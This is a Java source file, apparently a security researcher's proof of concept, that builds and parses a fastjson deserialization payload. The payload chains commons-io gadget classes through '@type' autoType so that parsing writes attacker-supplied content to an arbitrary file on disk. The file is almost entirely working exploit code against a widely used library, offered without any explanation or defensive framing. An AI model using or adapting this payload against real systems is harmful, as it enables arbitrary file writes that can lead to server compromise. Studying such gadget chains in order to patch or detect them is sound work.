package vul;

import com.alibaba.fastjson.JSON;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;

public class tmp {
    public static void main(String[] args) throws IOException {
        io1();
    }

    public static void io1(){
        String poc = "{\n" +
                "  \"x\":{\n" +
                "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "    \"input\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "        \"charSequence\":{\"@type\":\"java.lang.String\"\"${content}\"\n" +
                "      },\n" +
                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"bufferSize\":1024\n" +
                "    },\n" +
                "    \"branch\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                "      \"writer\":{\n" +
                "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                "        \"file\":\"D:/1tmp/123.txt\",\n" +
                "        \"encoding\":\"UTF-8\",\n" +
                "        \"append\": false\n" +
                "      },\n" +
                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"bufferSize\": 1024,\n" +
                "      \"writeImmediately\": true\n" +
                "    },\n" +
                "    \"trigger\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "    \"trigger2\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "    \"trigger3\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    }\n" +
                "  }\n" +
                "}";

        int i = 0;
        StringBuilder content = new StringBuilder();
        while (i < 4096){
            content.append("a");
            i = i + 1;
        }
        i = 0;
        while (i < 4099){
            content.append("b");
            i = i + 1;
        }
        String replace = poc.replace("${content}", content.toString());
        System.out.println(replace);

        JSON.parse(replace);
    }

}
